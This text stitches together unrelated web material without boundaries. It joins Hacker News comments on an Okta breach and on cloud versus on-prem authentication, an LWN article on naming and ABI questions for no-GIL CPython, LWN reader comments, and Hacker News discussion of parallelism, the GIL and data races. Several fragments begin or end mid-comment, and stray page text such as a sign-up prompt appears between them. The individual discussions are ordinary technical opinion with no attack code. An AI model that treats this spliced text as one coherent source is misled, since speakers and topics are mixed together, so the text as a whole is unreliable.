people for a month that reported 27 serious vulnerabilities, then another red team exercise that found a different 23 vulnerabilities, then another, then another, then another, always finding new ones because their systems are actually at the 100 K$ quality level. Those exercises do provide evidence and confidence in their security, you can be extremely confident their systems are grossly inadequate for their threat landscape. I have not looked, but the same can almost certainly be said about their certifications, audits, etc. since the gold standard that everyone aspires to is, when looked at objectively, grossly inadequate. reply eastbound 2 hours agorootparentIf they protect hundreds of billions in assets, then their bug bounty should be hundreds of billions minus $1.So that they never have to pay it.

Here&#x27;s an unpopular opinion: maybe critical gatekeeping with SSO using OAuth, SAML, and 2FA is something to run on-prem rather than pressing the SaaS \"easy button\".This includes not only Okta but Auth0 (Okta acquired), Authy, and Duo. reply StressedDev 10 hours agoparentUnfortunately, running things on-prem will not prevent security breaches and may be far far worse than relying on a cloud vender for authentication. Here is why:1. All software has security bugs. This includes on-prem software.2. Many IT groups do not have the expertise to run and secure a directory. You don’t just install some software, setup some accounts, and leave the box in the corner. You have to make sure the system survives disasters, you have to test backups, you have to figure how to determine if you were hacked, etc. This is very hard work.3. No one has ever shown that on-prem IT security is better than cloud vender IT security. My experience has been that some on-prem IT departments have very poor security. Here are some examples:- One IT department I worked with used a VPN which used an MD5 certificate. This was between 2010 and 2020. MD5 was cracked and it meant anyone could preform a man in the middle attack.- One IT department I worked with deployed a web service which allowed unauthenticated users to access person customer information (national ID&#x2F;tax number, address, name, phone number, etc.). Note the person doing this knew he was doing something unethical and did it anyway.- One IT department I know of supples nurses with an add supported text editor to type up patient notes. Adware is not know to value privacy and should never be used to process sensitive information.- One IT group I know of will not update Redcap to a supported version. The version of Redcap the IT department uses has known security bugs and the IT department was told about them. The official excuse for not upgrading it is the IT group does not like Redcap.I think Redcap is a piece of software which stores information used in medical studies and used to calculate public health statistics. It contains lots of sensitive data.My main point is moving from the cloud to on-prem may or may not improve security. It really depends on the capability of individual IT groups and many IT groups are not capable of running an identity service like Okta.The other thing to consider is cloud venders typically have much larger budgets and can spread costs over many customers. This means they can afford more security specialists, spend more on securing systems, spend more on detecting breaches, etc. reply jacquesm 10 hours agorootparentOn prem systems have the advantage of not being part of a monoculture, so if another party is breached that will not necessarily have immediate impact on your installation. reply runeks 36 minutes agorootparentThe most hacked software is on-prem Wordpress.Running the same software as everyone else on-prem doesn’t make it more secure — it might even do the opposite unless you’re quick to do security updates. reply acdha 8 hours agorootparentprevThis cuts both ways: if your on-premise system is using the same components as someone else you might be unpatched for longer than a responsible cloud service (c.f. Cisco customers currently for multiple product lines, F5, Atlassian, etc.). The challenge is accurately assessing whether your IT department is better or worse than a given cloud service. In both cases, I think more regulation is essential – companies shirk on things like ops staffing because it’s cheaper and that could change. reply the8472 1 hour agorootparentThe question is also whether those cloud providers are much better proportionally. They may put somewhat more effort into security but they&#x27;re also a much bigger target.Then there also is the question of cascading effects. E.g. if someone compromises a cloud provider and gains SSO access to Org A and Org B at the same time they might be able to do more harm reply the8472 1 hour agorootparentprevEveryone using a one of a few cloud providers means lots of golden eggs in very big baskets.Sure, everyone deploying things on-prem will mean attackers will focus on the software instead of the cloud vendor. But that&#x27;s A∨B vs. only B.> - One IT department I worked with used a VPN which used an MD5 certificate. This was between 2010 and 2020. MD5 was cracked and it meant anyone could preform a man in the middle attack.MD5&#x27;s collision resistance has been broken. Corporate VPNs are often deployed by shipping the cert&#x27;s pubkey on each client. In that case you&#x27;re not using PKI which means the switcheroo attack involving collisions aren&#x27;t relevant and you only need to rely on MD5&#x27;s preimage resistance which is still ok.So while using MD5 doesn&#x27;t smell great it&#x27;s not necessarily an open barn. reply high_5 3 hours agorootparentprev> My main point is moving from the cloud to on-prem may or may not improve security.

Given that the default assumption is that systems are easily hacked, then logically such a requirement demands proof (in the sense of robust evidence) before acceptance that it is met. There is no sense in waiting for it to happen first when that is the default assumption.To go a step further, you can apply this to any acceptance criteria. What evidence is there that any of these systems meet any meaningful acceptance criteria. What evidence is there that Okta has systems that can protect billions of dollars worth of assets from the teams of professional and state attackers that currently target their systems?To then get to your direct question, if you really need “should never get hacked”, you could provide machine checked mathematical proofs of correctness, robust and exhaustive validations, and NSA penetration test reports showing zero identified vulnerabilities like what was done for the F-35. I mean, I guess that is only like 1000x better than prevailing commercial IT systems and not completely foolproof, but it is certainly a good starting point.

The threat actor was able to view files uploaded by certain Okta customers as part of recent support cases.”So it wasn&#x27;t a full breach so much as someone was able to get in and view the support tickets customers have opened.

(again) reply samtho 13 hours agoparentRegardless of the impact of this breach in particular, your point still stands and is one I do share: this is a major downside to centralized identity providers. Their existence creates a centralized point of access that all an attacker must do is bypass once for some sort of benefit.“Security” as a practice within a company comprises of technology, process, and culture. Should one of these pillars be subverted by leadership in anyway, the organization security stance becomes crippled.In my experience, this security kneecapping happens because some bonehead exec looks at ways to cut costs or doesn’t like having to pull their phone out to login, and decided on a layoff or loosening of policy because, “we haven’t had any problems so far, so why do we have these staff members or this highly obstructive 2FA in place?” I mean, people used to die with greater frequency in car accidents prior to seat belts, too, maybe we can eliminate those next? reply sophacles 12 hours agorootparent> process, and cultureAre possibly even more important than the tech.

Please sign up today! By Jake Edge October 10, 2023 Back at the end of July, the Python steering council announced its intention to approve the proposal to make the global interpreter lock (GIL) optional over the next few Python releases. The details of that acceptance are still being decided on, but work on the feature is proceeding—in discussion form at least. Beyond that, though, there are efforts underway to solve that hardest of problems in computer science, naming, for the no-GIL version. ABI concerns In mid-September, Sam Gross, who authored PEP 703 (\"Making the Global Interpreter Lock Optional in CPython\"), posted a message to the Python discussion forum about the interaction of the PEP and the CPython stable ABI. In part, the stable ABI is used by extensions to enable their binary wheels to work with multiple CPython versions, thus not require rebuilds when CPython is released. The PEP envisions a path toward an eventual single CPython version without the GIL, but, in the meantime, there will be a build of the interpreter (using ‑‑disable‑gil) that can be used to test no-GIL operation. Gross noted that extensions built for the stable ABI will not actually work with a no-GIL CPython 3.13 (which is due in October 2024), but he is proposing some changes so that extensions will work with both types of CPython builds from that version onward. Extensions that only call into the \"limited\" C API result in binaries that use the stable ABI, so Gross suggested a few additions and changes to the API in order to facilitate extension binaries that can work with both interpreter types (GIL and no-GIL). In part, it adopts the existing plan to switch some macros to function calls, in particular for incrementing and decrementing the object reference counts that are used for garbage collection. Victor Stinner, who has done a lot of recent work on the stable ABI, replied that he thought there should a simple solution for extensions that can work on both interpreter types; he is concerned that the no-GIL experiment will fail otherwise. Because extensions that are built for the stable ABI on CPython 3.12 and earlier will not be compatible with no-GIL builds from 3.13 onward, he thinks it may make sense to create a new ABI version to differentiate the cases. Currently, the stable ABI is \"abi3\", but that could be bumped to abi4—even without moving to a Python 4. Many people seem to believe the ABI number and CPython major number are linked, but that is not the case. Gross is less concerned about the need for extensions that want to support no-GIL mode having to build two separate binary wheel versions as he described in his original message. He believes that building two wheels is a manageable price to pay and is more worried about tying the no-GIL project to fixes or upgrades to the C API and stable ABI. Alex Gaynor agreed about the price; he has multiple packages with abi3 wheels (and \"is very excited about the glorious nogil future\") that would be affected, but creating two wheels is not overly burdensome as a one-time thing. He does want to ensure that existing and future versions of pip do the right thing in choosing between them, however. Brett Cannon said that existing and older versions of pip would not do the right thing, unless a change to abi4 was made; the logic used in pip today would not be able to distinguish between the versions. Gross suggested that supporting older pip versions may not really be needed, since it is not an actual change in behavior: I don't think we should worry too much about whether old versions of pip work properly for the experimental, --disable-gil build of CPython 3.13. As it is, old versions of pip frequently do not work with new versions of Python. For example, pip==23.1.1 and older (from just 5 months ago) will break if installed in CPython 3.13 (missing pkgutil.ImpImporter). pip maintainer Paul Moore pointed out a difference, though: breakage is different from silently doing the wrong thing: I think it's fine if an older version breaks for newer Python. But I'm less sure that silently installing the wrong package is acceptable. People do use older versions of pip, and loud breakages aren't the same as silent errors. He noted that pip has a policy that users should always upgrade to the latest version, but that the project has no specific policy on silent errors of this sort. He is concerned that those who want to experiment with the no-GIL (or \"free-threaded\") builds will be put off if they end up \"having to debug ABI compatibility issues like this\". Gaynor agreed, noting that \"pip silently doing the wrong thing creates a flood of issues\" for the packages affected. Barry Warsaw asked about whether there were plans for allowing installation of both interpreter types on the same system. Gross said that the situation was the same as having two different versions of Python installed. Warsaw thought that was reasonable and that it is not too difficult handle parallel installations. In the message linked above, Cannon said that one solution could be a \"fat\" wheel that had both binaries, as long as the names of those binaries in the wheel were distinct. Naming But the naming discussion got spun off into its own thread—once it clearly headed in that direction, anyway. Moore said that it was important to be able to install both interpreters so that people can easily test the no-GIL mode; if that is not straightforward to do, in Windows, macOS, Linux, and others, it will negatively impact the no-GIL project: This links back to the packaging question, because how easy it is for users to try out nogil builds, and how easy it is for a user to select between nogil and gil, will strongly affect how much demand there is for nogil builds, and hence how much pressure there will be on package maintainers to provide nogil-compatible wheels in the first place. Barry Scott wondered what names would be used, noting that the \"shebang line\" (i.e. \"#!/usr/bin/python\" or similar at the top of a script) needs to indicate which interpreter to invoke, which should the same across all of the platforms if possible: The gil version of python executable is \"python3\". What is the name of the nogil executable? \"python-nogil3\", \"python-nogil3.13\" etc? But the no-GIL build for 3.13 is clearly meant as an experimental feature, Gregory P. Smith said, which means that distributions should not be putting that build on the default $PATH, at least in his opinion. Smith is a member of the steering council, but noted that he was using his \"personal reply hat\". Having a lengthy name for the interpreter that lingers for long periods afterward because it remains in shebang lines is not desirable, so he suggested waiting: In effect this defers any potential install naming decision until 3.14 or later once we've got some practical knowledge of how things are working out - we'll presumably know better at that time if there's a need for parallel installs. It's okay for some things like this to be decided later, in effect that is why PEP-703 has an Open Issues section not fully specifying this area today. But Fedora developer Petr Viktorin pointed out that distributions are likely to want to package the no-GIL interpreter for their users to experiment with. Moore agreed that users are going to want that: I would like to be able to write scripts with #!/usr/bin/env python3.13-nogil (or something like that) in order to get the free threaded build without needing to hard-code a long and probably non-intuitive path (which on Windows is also user-specific). In another thread that was started by Steve Dower, who creates the official Python packages for Windows, Smith noted that the steering council has agreed that it wants to avoid the name \"nogil\" to describe the build. With his council hat on, he said that there were two reasons behind this decision: it \"does not communicate well to most non-core devs, people need not know what a GIL is\" and it contains a negative. There is a suggested alternative: A more appropriate term for this experimental in 3.13 build if you have a need to provide builds is \"free-threading\". We realize \"free-threading\" doesn't roll off the tongue like two-syllable \"nogil\" does, but it should be more understandable to people-who-are-not-us. That set off some predictable bikeshedding on naming, with several in the thread noting that they think \"nogil\" is the better choice—or at least that they are perfectly happy with that name. Gross thought that the suggested alternative was confusing: \"While I understand the objections to 'nogil', I don't think 'free-threading' is likely to be understood by people-who-are-not-us.\" He noted that the term is not widely used elsewhere. Most participants generally just wanted to use something short—\"nogil\" was the clear \"winner\" in that department—but none of the suggestions made there seemed to resonate. The one concrete change was to switch the ABI tag for the no-GIL builds from \"n\" to \"t\" (for \"threading\"). Excising \"nogil\" at this point is going to be something of an uphill climb, it would seem. Proposing abi4 Back in the original thread, there was some discussion, mostly between Viktorin and Gross, about problem areas in the API changes that Gross proposed. That led to a new proposal that incorporated the feedback and adopted the idea of creating a new ABI, abi4. Gross has developed a prototype of the new ABI. Viktorin is generally in agreement with the approach, though some details still need to be worked out. One of those details is that a PEP for abi4 is needed, as Stinner pointed out. Viktorin agreed (\"This is a pre-PEP discussion.\") and it would seem that the mid-October core developer sprint will be the venue for some face-to-face discussions on the topic. In particular, there is confusion about the compatibility guarantees provided by the combinations of various limited API versions and abi3, which will impact what will happen with abi4. Research on those issues is ongoing. So, work on the no-GIL (or free-threaded) version of CPython is proceeding apace, but the final acceptance of the PEP is still pending. It is somewhat surprising that there has been such a lengthy delay, but PEP 703 and its knock-on effects are likely to dominate CPython development—and ecosystem—over the next five or more years, so the steering council wants to make its acceptance criteria clear. As council member Thomas Wouters put it: \"we're ironing out the exact acceptance text (we want to clarify a lot of our decisions)\". Some of that work may happen at the sprint as well.

Seems like a logical cut-off point. Progress on no-GIL CPython Posted Oct 10, 2023 22:09 UTC (Tue) by ringerc (subscriber, #3071) [Link] Probably because it doesn't actually directly affect most Python code. Unless you're using the C API it's (generally) not going to impact you much, if at all. Progress on no-GIL CPython Posted Oct 11, 2023 14:15 UTC (Wed) by ericproberts (subscriber, #139553) [Link] It's a major backwards-incompatible change given the number of python libraries written in C. A major version increase would indicate python users might need to do some extra work to upgrade, even if just bumping up dependency versions -- and, let's be real, some libraries will just fall out of use instead of become nogil-compatible, so upgrading won't *necessarily* be straightforward. No need to pretend that isn't what this is. And there's nothing wrong with major version upgrades that require most users to do some work to upgrade. It's just the previous upgrade made python scared of its own shadow. Progress on no-GIL CPython Posted Oct 11, 2023 16:28 UTC (Wed) by NYKevin (subscriber, #129325) [Link] IMHO it's not time for that *yet.* A major version bump will, rightly or wrongly, be interpreted as a promise that nogil will definitely land in mainline at some point in the near future, and that doing so will necessarily break backcompat. Based on how it is described in this article, I don't think the work is far enough along yet to make either of those promises: * It may turn out that nogil only offers a performance win in a narrow set of circumstances that are atypical of most Python code, and so nogil Python becomes a separate, non-default mode of the interpreter, and relatively few programs actually use it in practice. * It may turn out that a future version of the interpreter is able to create some sort of coarse-grained locking scheme that is \"good enough\" to be backwards compatible with \"most\" C extensions, perhaps requiring at most a simple recompile. * It may turn out that nogil is so costly and infeasible that the work is dropped entirely. It doesn't currently look like it's trending in that direction, but development timelines are notoriously hard to predict. * It may turn out that a major version bump is the best way to express nogil's effect on the Python ecosystem, but they can cross that bridge when they come to it. Progress on no-GIL CPython Posted Oct 11, 2023 18:34 UTC (Wed) by iabervon (subscriber, #722) [Link] It seems entirely plausible that every C module written for 3.5 and recompiled for each later version will end up working fine with a Python that makes the no-gil implementation the normal one, but that loading such a module makes multithreaded performance even worse than 3.5 with respect to contention, due to causing everything to require a global and less subtle lock. On the other hand, programs using libraries not updated to deal well with the new interpreter probably don't use threads and don't care. Progress on no-GIL CPython Posted Oct 11, 2023 19:20 UTC (Wed) by NYKevin (subscriber, #129325) [Link] > [...] but that loading such a module makes multithreaded performance even worse than 3.5 with respect to contention, due to causing everything to require a global and less subtle lock. That is not a compatibility break. That is a quality of implementation issue. If the code still works and gives the right answer in a somewhat-believable* amount of time, then it is compatible. The question is whether this is a good or a bad tradeoff to make, not whether it will break anything. Offering two versions of the interpreter (or better yet, a flag/environment variable) would be one way to mitigate that issue, but they might instead reasonably decide that maintaining both versions is not worth the effort. * I'm not going to precisely define \"somewhat believable amount of time,\" but if performance on a modern system is comparable to the previous version on hardware released within the 21st century, then that's probably good enough. If it runs like a PDP-11, then that's probably too slow. Progress on no-GIL CPython Posted Oct 11, 2023 8:20 UTC (Wed) by danielthompson (subscriber, #97243) [Link] nogil is essentially a change to the CPython implementation rather than the Python language. Adopting python4 would imply for many people that the releases included major incompatible language changes similar to what happened in python2 to python3. Progress on no-GIL CPython Posted Oct 13, 2023 4:31 UTC (Fri) by stephanlachnit (subscriber, #151361) [Link] Just because this was the case, doesn't mean that has to be true for Python 4 as well. Python 3 has removed stdlib modules, which is already a breaking change. While I agree that tagging a new version without some testing is not helpful, but I hope that they eventually just tag it Python 4. Progress on no-GIL CPython Posted Oct 13, 2023 9:15 UTC (Fri) by NRArnot (subscriber, #3033) [Link] Precisely my first thought. Python4 should be defined as python-nogil. The Python language is the same for both versions, and future language additions would stay in step i.e. python3.15 and python4.15 would always run the same pure Python code without issues. BUT using a different abi, so python3 libraries won't necessarily be available under python4 to start with (or sometimes, never). A long, LONG way down the road, python3 might be retired, because there's nothing significant left that python4 can't do.

Progress on no-GIL CPython Posted Oct 13, 2023 8:46 UTC (Fri) by tsr2 (subscriber, #4293) [Link] Would it be helpful to have the name flag that this is an experimental version?

Progress on no-GIL CPython Posted Oct 19, 2023 20:01 UTC (Thu) by jepsis (guest, #130218) [Link] Considering renaming 'nogil' to 'ng' would be a good idea. It also hints at 'next generation', which remains relevant. Progress on no-GIL CPython Posted Oct 21, 2023 9:48 UTC (Sat) by mirek (guest, #85311) [Link] Use -ng suffix.

A lot of parallelization can be achieved with web-workers, but of course at the cost of relying on copying memory between workers (ie no shared memory).There have been some proposals to add full shared memory constructs (SharedArrayBuffer) and synchronization (Atomics) mechanisms, but they are special constructs and don&#x27;t work with normal javascript objects. Quite limited but provide full parallelism for things that usually need it (buffers).One thing people often forget is that thread-safe data structures are usually a lot slower than single-threaded one, everything in JS is single threaded and in the event loop, but if you really need it there are some scape hatches.I don&#x27;t know, this just feels better and simpler? If you really need to you can go down to a lower level language for full memory sharing data structures. reply logicchains 1 hour agoparent>I am not an expert in python but I feel that the JS model where everything is on the event loop and there is no actual threads seem better for a dynamic languagePython has become essentially the primary language for scientific computing and deep learning, and for this the JavaScript approach is absolutely inadequate.

If you really need to you can go down to a lower level language for full memory sharing data structuresA low level language is already used in Numpy, PyTorch etc., but that&#x27;s not enough; the Python glue code becomes unnecessarily painful when using multiprocessing, pain that would go away with proper threads. reply Affric 12 hours agoprevInteresting discussion there too.With modern computers I wonder if explicit parallelism is more fundamental to what our computer science will be than is in vogue in textbooks. Perhaps we should always be writing explicitly parallel code at this point. reply Gh0stRAT 12 hours agoparentHumans are bad at reasoning about multiple threads simultaneously, so I suspect the more practical shift is the trend we&#x27;ve already been seeing toward more declarative syntax.eg `for` loops are being replaced by `foreach` loops,`map` and `filter` operations, etc. These tell the compiler&#x2F;interpreter that you want to do some operation to all the items in your datastructure, leaving it up to the compiler&#x2F;runtime whether and how to parallelize the work for you. reply MR4D 11 hours agorootparentI would upvote this 100 times if I could.I&#x27;ve thought this way ever since MacOS added the Grand Central Dispatch [1]. Of course, I thought industry would follow quickly and that tooling would coalesce around this concept pretty quickly. Seems the industry wants to take its sweet time.[1] - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Grand_Central_Dispatch reply cpgxiii 11 hours agorootparentI mean, OpenMP dates back to 1997 (1998 for C and C++). Apple, however, has never supported it for what can only be selfish reasons (particularly since Clang has a quite good implementation provided by Intel, which can easily be installed on a Mac if you want). GCD came a decade later.For basic parallelism, nothing beats OpenMP for ease of adapting existing code (often a single \"#pragma omp parallel for\" directive is enough). Even for more complex parallelism, particularly where per-thread resources need to be managed, OpenMP still provides a much simpler programming model than the alternatives. reply Jtsummers 10 hours agorootparentOpenMP and GCD solve different problems. You&#x27;d not want to use GCD to parallelize the same tasks you&#x27;re parallelizing with OpenMP in most cases. GCD is more suited for the one-off cases (toss this task into the queue, toss that task into the queue; or \"as we get new items from the user toss the processing into the queue\" but we don&#x27;t know the rate of new items coming in so batching doesn&#x27;t make as much sense), vice OpenMP which is targeting things like scientific computing&#x2F;simulations where you know you have a million objects you want to perform a computation on. The GCD version of the same would be slower by a large measure if you spawned a task per work item or you&#x27;d recreate parts of OpenMP to divide the work across a smaller number of tasks. And you wouldn&#x27;t want to use OpenMP for parallelizing the kind of things you toss into a work queue model like GCD offers. reply cpgxiii 10 hours agorootparentSure, OpenMP and GCD provide different interfaces around the same concept of a managed threadpool. Given both, one would use them for different tasks (in the same way one actually uses OpenMP and std::async for complementary purposes). But in the context of GP&#x27;s basic parallelelized for&#x2F;map&#x2F;reduce operations, either can be used fine (although OpenMP would probably be more pleasant to write). reply osigurdson 8 hours agorootparentI&#x27;m not familiar with GCD but after reading the wiki page, I&#x27;d say most languages have something like that: a queue that you can add things to, items can then be processed by multiple threads of execution.I&#x27;d also say that most languages have something similar to OpenMP, parallel for loops, etc. Great if you have some read only data in arrays and wish to process it.However, in my opinion, it doesn&#x27;t really matter how convenient a parallel &#x2F; async programming model is to use as the real work is ensuring that there isn&#x27;t any shared mutable state being updated in parallel. The other issue is, once you have formulated &#x2F; re-formulated a particular problem to this model, ensuring that it remains this way is pretty challenging on larger teams. Someone can easily unknowingly commit something that breaks such assumptions. reply cpgxiii 5 hours agorootparentAt the end of the day, no matter what kind of code you are writing, you either have tools and processes in place that reduce the risk&#x2F;mitigate the impacts of bugs, or there is always the risk of serious problems being introduced. An unknowing change that breaks parallelism in another component could just as well be an unknowing change that breaks authentication or defeats a security boundary.Parallelism introduces an additional class of bugs, but they are fundamentally addressed the same way as any other class of bugs - e.g. testing, tools, and code review. If some_one_ can unknowingly break a system, that means the tools and processes weren&#x27;t good enough. replydogleash 8 hours agorootparentprev> Seems the industry wants to take its sweet time.We&#x27;re inching towards an in vogue way to do what erlang had figured out in the 80&#x27;s.

Your compiler is bad at reasoning about multiple threads simultaneously. reply dehrmann 8 hours agoparentprevParallelism ended up going off in a few different directions.For things like running a web service, requests are fast enough, and the real win from parallelism is in handling lots of requests side-by-side. This is where No-GIL comes in.Within handling a single request, if there are a lot of sub-requests, that&#x27;s usually handled by async code, but not so much for the async performance win as much as spinning up threads is either expensive or thread pools are a hassle. Remember that async is better for throughput, but worse for latency, and if you&#x27;re parallelizing a service request, you&#x27;re probably more worried about latency. Async won mostly on ergonomics.The other place you see parallelism is large offline jobs. Things like Map-reduce and Presto. Those tend to look like divide-and-conquer problems. GPU model training looks something like this.What never happened is local, highly parallel algorithms. For a web service, data size is too small to see a latency win, they&#x27;re complicated, and coordination between threads become costly. The small exceptions are vectorized algorithms, but these run one one core, so there isn&#x27;t coordination overhead, and online inference, but again, this is heavily vectorized. reply rsaxvc 8 hours agorootparent> What never happened is local, highly parallel algorithms.GPUs maybe? Also, excellent answer. reply eslaught 10 hours agoparentprevParallelism in CS is a bit like security in CS. People know it matters in the abstract senses but you really only get into it if you look for the training specifically. We&#x27;re getting better at both over time: just as more languages&#x2F;libraries&#x2F;etc. are secure by default, more now are parallel by default.

Is Legion the system, and Regent the language?Can Legion be used without Regent, or vice versa? reply eslaught 5 hours agorootparentLegion is a C++ runtime system. It exposes APIs in C++ and C. You can write code directly to it with C++ (and CUDA&#x2F;HIP&#x2F;SyCL if you want to use GPUs). But the only requirement is a C++ compiler and standard build system (Make&#x2F;CMake).Regent is a programming language. The compiler for Regent generates Legion code. Semantically, Regent is mostly a simplification of Legion. There are fewer moving pieces, so fewer things you need to worry about. Many of the \"gotchas\" that exist in Legion are taken care of by the language&#x2F;compiler so idiomatic code usually \"just works\". It also does GPU code generation for you so you don&#x27;t need to hand-write CUDA&#x2F;HIP&#x2F;etc. The tradeoff is that you&#x27;re using a new programming language, so you have to be willing to take that risk. reply samsquire 11 hours agoparentprevLMAX Disruptor has on their wiki that average latency to send a message from one thread to another at 53 nanoseconds.

The answer to your question is very general at a high level. Any task that can be broken up into chunks benefits. In the simplest terms, tasks that can be computed in buckets with a final result computed from those buckets will benefit from concurrency. Think of a video game as a good example. Environment calculations are happening in the background while the main game loop is processing.

Because what we have now is typically explicit paralellism. Creating a thread or forking a subprocess is explicit parallelism, the programmer chooses that option. A function like `map` that can utilize a parallel or sequential implementation depending on circumstances the runtime or compiler are aware of without direct input from the programmer would be implicit parallelism. If the `map` function takes an execution context that signifies parallel or sequential execution then we&#x27;re back to explicit. reply fulafel 6 hours agoparentprevIt seems serious parallel programming has mostly gone with shader&#x2F;ISPC style data-parallel computation with low-level languages and the old school threads & locks model has been relegated to a side support role lost except on the CPU side.There&#x27;s interesting stuff going on in the VHLL world with languages like Futhark, Jax, Mojo, etc that would be a better peer group for Python and its high level of abstraction. reply jeremycarter 11 hours agoparentprevI think this is why I&#x27;m a huge advocate of the Actor Model. reply jacquesm 9 hours agorootparentLikewise, it is one of the best solutions to this problem.

So much existing multithreaded Python code is written in an unsafe manner.Specifically, talking about data races I’ve seen time and again in codebases across companies and OSS projects. The programs don’t break only because they implicitly rely on the GIL providing execution to a single thread at a time. If the GIL is gone, then these programs will break. And since Python is such a dynamically typed language, I seriously doubt that there exists a static analyzer that could identify these issues in existing Python programs. More likely, they’ll be insidious bugs that crop up at runtime in a non-deterministic fashion. Ideally leading to a crash, With this class of bugs, it’s likely to just result in incorrect operations being performed.Perhaps this GIL-less proposal isn’t actually intended to be used on the overwhelming majority of programs? Maybe it’s just a hyper specialized tool for a very few number of circumstances where the programmer knows, there won’t be a GIL, and can program against that fact? reply pdonis 10 hours agoparentIf you have a multi-threaded program with data races, you already have a problem. The GIL does not mean no data races are possible. It just means that only one thread at a time can run Python bytecode. But the interpreter with the GIL can switch threads between bytecodes, and many Python operations, including built-in methods on built-in types that many people think of as \"atomic\", require multiple bytecodes. That&#x27;s why Python already provides you with things like locks, mutexes, and semaphores, even though it currently has the GIL. reply rtpg 8 hours agorootparentTo put a finer point on this, I’ve had the misunderstanding in the past that the GIL made Python like JavaScript in some sense (only releasing the GIL on some explicit parts of code like sleep). But really Python threads can switch in the “middle” of your code. The reason the GIL is annoying is mostly performance related for Python code itself.My understanding is the GIL does not protect against Python-side bugs, and bugs from GIL removal would only be introduced from C extensions. reply wokwokwok 7 hours agorootparent? Why do you think this?This has been discussed extensively in the past (1), and my understanding of the take away was that the GIL doesn&#x27;t protect you from arbitrary execution order; it protects you from undefined behavior due to concurrent write&#x2F;read in parallel scopes and the resulting data corruption....which, as I understand it, there is no specific reason it would be restricted to native extensions.Is there some more detail to the nogil proposal that addresses the type of UB you see in eg. c, with this?

But in the GIL world, a C extensions method that doesn’t release the GIL and doesn’t call into Python has an extra guarantee that it won’t be interrupted at all. This means that in GIL-land, a C extension can have implicit critical sections that stop being so in noGIL land. reply rfoo 3 hours agorootparentprevWhat you said is precisely what nogil work is about.

Threads contending for the GIL can already steal it from each other at unfavorable times and cause havoc. reply ynik 12 hours agorootparentIn fact, it prevents very few race condition bugs.Even inside a C extension where the Python API feels like it gives you control over when you release the GIL (with functions you&#x27;d have to call explicitly to release the GIL), it turns out that:* any operation that allocates new Python objects might trigger garbage collection* garbage collection may run `__del__` of objects completely unrelated to the currently running C code* `__del__` can be implemented in python, thus releasing the GIL between bytecode instructionsThus there&#x27;s a lot of (rarely exercised) potential for concurrency even in C extensions that don&#x27;t explicitly release the GIL themselves. nogil will make it easier to trigger data race bugs, but many of them will already have been theoretically possible before. reply plonk 13 hours agoparentprevI think the point was to let libraries declare whether they support nogil mode (opt-in), and your program would only run with no GIL if all the dependencies allow it?

There&#x27;s plenty of spots where a single script makes sense, and plenty where it doesn&#x27;t. reply Too 4 hours agorootparentprevIf that is the only way. They need to change some semantics around import statements to not be runtime conditional. (Mypy can do it without running the code so to some extent it is possible). With that in place, each module can at the top declare #nogilsafe and the interpreter can know that no more modules will be loaded runtime. Dynamic imports via importlib will need other consideration.Expecting every transitive module to add this marker is very optimistic though. It’s thousands of packages with hundreds of modules each, that need to add this everywhere.Other languages have done similar journeys, like typescript “strict” added at top of each file. Except those are a lot more local, by not expecting all dependencies to follow. reply Borealid 12 hours agorootparentprevIf you import another module the gil could be re-enabled.Not saying that&#x27;s what they will do, just what they could. reply KMag 11 hours agorootparentRight. It would be possible to implement the GIL as a readers-writer lock, where thread state includes a counter for the number of frames in the call stack that are within libraries not marked nogil. (Let&#x27;s call these non-nogil libraries \"GIL-dependent\".)When the count goes from zero to one, the thread attempts to upgrade its reader lock to a writer lock. When its count goes from one to zero, the thread downgrades its lock from writer to reader.That way, there&#x27;s at most one thread executing within GIL-dependent code at a time. Furthermore, if there is a thread executing within GIL-dependent code, all of the other threads are blocked waiting to acquire the GIL (in reader mode if they&#x27;re nogil-safe, and writer mode if they&#x27;re GIL-dependent.)As now, any thread holding the GIL in writer mode would need to drop the GIL when attempting to acquire any other lock (and re-acquire immediately afterward).To prevent starvation, one would presumably need a mechanism similar to periodic GC safepoints where nogil-safe threads still check if any thread is waiting to acquire the GIL in writer mode. reply tgv 3 hours agorootparentprevYes, but the plan is to remove the opt-in in time. That will put a lot of pressure on the eco system. I expect many libraries written in C or relying on C-based extensions to simply get dropped.

Rather than removing the global lock and breaking existing code, OCaml 5 introduces a new primitive called a \"domain\" which manages one or more threads with a shared lock.So the existing threads API spawns threads in the current domain, which lets you isolate code that expects to take the lock, while new code can spawn new domains starting with one thread instead. You can also use both deliberately as a form of scheduling.Python instead is trying to make the lock entirely optional, globally and outside the control of library writers. However, I think the Python lock is only guaranteed to protect the runtime itself, so most code depending on it is probably buggy anyway, so I think their plan is viable.The only thing they may have in common is having to scan the entire codebase of their runtimes for unexpected shared state and fix that, as well as revising their C ABIs. reply mirekrusin 12 hours agoprevUse -ng (no-gil or next-generation). reply qeternity 13 hours agoprevI find the current focus on GIL-less Python really strange.

True multi-threading would be great, but I would much rather have improved single threaded performance first.I of course respect that our needs may not represent everyone else&#x27;s, and we are grateful for all the work that has gone into making Python a great language. But what am I missing? reply bratao 13 hours agoparentIn my opinion, Python needs to have an urgent answer to the use of multiple cores. AMD just launched a CPU with 96 cores. Today the use on multiple cores is through the use multiprocess, which has many limitations. I understand that the multiple interpreters could come with something like Goroutines, but I still like the real multi thread option more. reply dekhn 12 hours agorootparentI&#x27;ve changed my opinion about this after many years.A long time ago IronPython was released which showed that you could build a high performance Python interpreter that was GIL-free. It had thread-safe containers (so multiple threads could work against the same lists, dictionaries, etc) and in some cases was faster than CPython (it was implemented using CLR and .net)When I saw IronPython I was immediately convinced that CPython should be the same way- already low-cost dual and quad core Intel machines were becoming available and it seemed like core counts were going to increase faster than clock rates. I figured that a small hit to serial performance would be more than acceptable if people could write multithreaded systems in Python, in much the same way as I wrote multithreaded C++.Over time after watching nogil not going anywhere in CPython (the python leadership didn&#x27;t want to do nogil), with concomitant speedups in the single-processor implementation, along with the increasing use of C++ code that releases the GIL, and seeing that many people just weren&#x27;t good at multithreaded programming, I have started to conclude that the multithreading&#x2F;multiprocess in Python today is about the best we can get. That is, instead of having threaded containers and multiple interpreter threads all banging on the same underlying data, it&#x27;s a lot easier to just use threads as work queues that have minimal interaction with other threads.So that&#x27;s where I&#x27;ve ended up: some of my code using multiprocessing, typically the Pool or ThreadPool, with the concurrent future API to handle result-gathering, barriers, etc. Other code has an external system that starts many python processes from the command line and waits for those processes to complete. Other code is single-threaded in python and launches C++ cores that launch multiple threads just to return a computational result to python faster.And I think trying to do both gil and nogil interpreters, rather than committing to one or the other, the python leadership will sign us up for untold inconveniences around packaging. We already 